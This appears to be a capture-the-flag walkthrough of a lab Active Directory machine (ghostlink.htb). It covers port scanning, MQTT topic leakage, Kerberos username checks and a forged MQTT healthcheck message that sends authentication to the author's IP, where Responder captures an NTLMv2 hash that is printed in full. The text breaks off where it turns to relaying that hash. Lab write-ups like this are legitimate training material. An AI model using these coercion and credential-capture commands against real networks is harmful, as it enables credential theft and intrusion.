# Host file setup
```python
sudo nxc smb 10.129.64.193 --generate-hosts-file /etc/hosts                                          
SMB         10.129.64.193   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.64.193 -vv

Nmap scan report for 10.129.64.193
Host is up, received user-set (0.013s latency).
Scanned at 2026-09-30 15:36:00 BST for 98s
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
1883/tcp  open  mqtt             syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49680/tcp open  unknown          syn-ack
49682/tcp open  unknown          syn-ack
49904/tcp open  unknown          syn-ack
49916/tcp open  unknown          syn-ack
57507/tcp open  unknown          syn-ack
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,1883,2179,3268,3269,5985 -A --min-rate=2000 -sT -Pn dc01.ghostlink.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 15:43 +0100
Nmap scan report for dc01.ghostlink.htb (10.129.64.193)
Host is up (0.013s latency).
rDNS record for 10.129.64.193: DC01.ghostlink.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ghost Protocol Zero
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-30 22:44:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
1883/tcp open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/brokers/client_status/mqttui-193ac33: {"status":"online", "username":"(null)", "ts":1790808295023,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-193ac33","clean_start":1, "IPv4":"127.0.0.1"}
|     $SYS/brokers/client_status/mqttui-ee871317: {"status":"offline", "username":"(null)","ts":1790808292948,"reason_code":"0","client_id":"mqttui-ee871317","IPv4":"127.0.0.1"}
|     $SYS/brokers/client_status/mqttui-15b65856: {"status":"offline", "username":"(null)","ts":1790808290859,"reason_code":"0","client_id":"mqttui-15b65856","IPv4":"127.0.0.1"}
|_    $SYS/brokers/client_status/mqttui-7c5b9a24: {"status":"offline", "username":"(null)","ts":1790808288768,"reason_code":"0","client_id":"mqttui-7c5b9a24","IPv4":"127.0.0.1"}
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth enabled as with all DCs by default but cannot use it to enumerate

Guest account is also disabled

# HTTP (80)

The landing page is doing a get request to landing.mp4

No subdomains, and no hidden endpoints that feroxbuster could find

# MQTT (1883)

https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html

```python
mosquitto_sub -h dc01.ghostlink.htb -p 1883  -t '#' -v

GhostProtocolZero/energy/grid/frequency {"timestamp":"2026-30-09-15:35:35","node":"node-3","telemetry":{"ip":"10.4.23.11","loadPercent":59,"hz":193694136.2}}
GhostProtocolZero/identity/trust-provider/state {"timestamp":"2026-30-09-15:35:35","node":"node-1","telemetry":{"ip":"10.1.12.34","tokenValidation":"normal","authErrors":9}}

...[SNIP]...
```

This leaks two IP addresses 

Ill place the full output into a text file and use grep to filter the output

```python
cat mqtt_output.txt | grep 'ghostlink.htb'
GhostProtocolZero/network/node/healthcheck {"timestamp":"2026-30-09-15:35:35","node":"node-3","telemetry":{"healthy":true,"url":"https://transport.ghostlink.htb/keepalive","lastCheckSecAgo":4,"ip":"10.4.23.11"}}
GhostProtocolZero/network/node/keepalive {"timestamp":"2026-30-09-15:35:35","node":"node-1","telemetry":{"rttMs":168,"status":"alive","url":"https://core-telecom.ghostlink.htb/keepalive","ip":"10.1.12.34"}}
GhostProtocolZero/systems/node/domain/healthcheck {"timestamp":"2026-30-09-15:35:50","node":"node-4","telemetry":{"healthy":true,"url":"dc01.ghostlink.htb/healthcheck","latencyMs":53,"ip":"10.129.64.193"}}
GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"2026-30-09-15:35:50","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","lastCheckSecAgo":31,"responseCode":"200","ip":"172.16.20.20"}}
GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-30-09-15:35:50","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":12,"responseCode":"200","ip":"172.16.20.10"}}
```

As seen here there are several subdomains in here

```python
transport.ghostlink.htb
core-telecom.ghostlink.htb
gpz-op26-toolkits.ghostlink.htb
gpz-op26-secure.ghostlink.htb
```

Ill add these to `/etc/hosts` and see if any actually exist

![](Pasted%20image%2020260930195354.png)

![](Pasted%20image%2020260930195406.png)

The first two subdomains dont exist

I dont have credentials yet so ill start with the gogs host

![](Pasted%20image%2020260930195733.png)

Got some users

Using nxc ill test these username with a blank password and try authenticating with kerberos and see what errors i get

So all users apart from `gpz-tools-admin` gives the error `PREAUTH FAILED` which means they are valid domain users

![](Pasted%20image%2020260930200108.png)

There is also 6 public repos i can look through

# Coercing authentication

There is nothing too interesting in any of the repos and all of them only have one commit so no interesting commit history

```python
GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"2026-30-09-15:35:50","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","lastCheckSecAgo":31,"responseCode":"200","ip":"172.16.20.20"}}

GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-30-09-15:35:50","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":12,"responseCode":"200","ip":"172.16.20.10"}}
```

Looking back at the message logs i see one that its doing a healthcheck on both of the subdomains

So if i can send a message using `mosquitto_sub` i might be able to coerce it back to me and get a hash

```python
sudo responder -I tun0
```

First ill start responder

```python
mosquitto_pub -h dc01.ghostlink.htb -p 1883 -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -m '{"timestamp":"2026-30-09-15:35:50","node":"node-6","telemetry":{"healthy":true,"url":"10.10.14.61/healthcheck","lastCheckSecAgo":12,"responseCode":"200","ip":"172.16.20.10"}}' -r
```

Ill use the exact same message from before, all ill change is the URL by putting my IP in there

```python
[HTTP] NTLMv2 Client   : 10.129.64.193
[HTTP] NTLMv2 Username : ghostlink\svc_canary
[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:02579bdde328c545:9ED743C894FB1151420CC6262E36D047:010100000000000095A829C85551DD01A738344FB8FB583C0000000002000800510049005300560001001E00570049004E002D00490035004E00450053004200420036004800340031000400140051004900530056002E004C004F00430041004C0003003400570049004E002D00490035004E00450053004200420036004800340031002E0051004900530056002E004C004F00430041004C000500140051004900530056002E004C004F00430041004C0008005000500000000000000000000000004000003D4AE63EC2B0B65FF673527598881A80C6BAF28844091FC3FC464858664512E49EA6E0B56B1FC312F086641EDEA22BE27F255F4E3441AFE2B8AB0BC43190031D0A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00360031000000000000000000
```

The hash did not crack, but rather than capturing auth on my machine i can relay it to the host and bypass the native logon

